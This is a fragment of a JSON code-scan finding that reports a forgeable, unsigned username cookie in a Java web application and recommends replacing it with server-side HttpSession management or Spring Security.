          "properties": {
            "impact": 5,
            "likelihood": 5,
            "snippetStartLine": 51,
            "summary": "Plain username stored as cookie value with no signing; any user can forge a cookie to impersonate any account including admin",
            "remediationSummary": "Replace the plain username cookie with a server-side session (HttpSession) so session tokens cannot be trivially forged.",
            "remediation": "\nReplace the ad-hoc cookie scheme with proper session management:\n\n1. On successful login, call `request.getSession(true)` (invalidating any existing session first with `request.getSession(false).invalidate()`) to obtain a container-managed, cryptographically random session ID that is stored server-side.\n2. Store the authenticated username in `session.setAttribute(\"authenticatedUser\", username)`.\n3. In the authentication filter, check `session.getAttribute(\"authenticatedUser\") != null` rather than cookie existence.\n4. Alternatively, integrate Spring Security, which provides all of this out-of-the-box.\n"
          }
